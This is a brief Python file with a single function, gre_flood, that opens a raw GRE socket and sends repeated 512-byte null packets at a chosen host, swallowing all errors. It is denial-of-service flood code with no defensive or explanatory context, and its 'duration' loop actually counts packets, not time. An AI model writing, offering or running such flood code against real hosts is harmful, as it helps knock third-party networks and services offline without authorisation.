import socket


def gre_flood(host, duration=30):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
        while duration > 0:
            try:
                s.sendto(b"\x00" * 512, (host, 0))
            except Exception:
                break
            duration -= 1
        s.close()
    except Exception:
        pass
